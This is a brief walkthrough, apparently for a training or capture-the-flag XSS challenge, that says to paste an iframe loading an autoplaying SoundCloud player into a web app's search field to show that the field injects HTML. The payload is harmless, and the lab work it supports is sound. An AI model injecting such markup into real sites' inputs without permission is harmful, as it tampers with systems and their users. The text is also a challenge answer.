### XSS Song 

You can find a Video Descrition on this following Link:
```bash
https://www.loom.com/share/6a78aeb3b1a2442eb0752b79d08bbf71
```


1. Navigate to Serchnavigation: 
<img src="img/XSS_Suchleiste.png">

2. Put this following Iframe on the Search Field: 
```bash
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

3. Now you can see a Box where you can play and stop the loaded Music. 
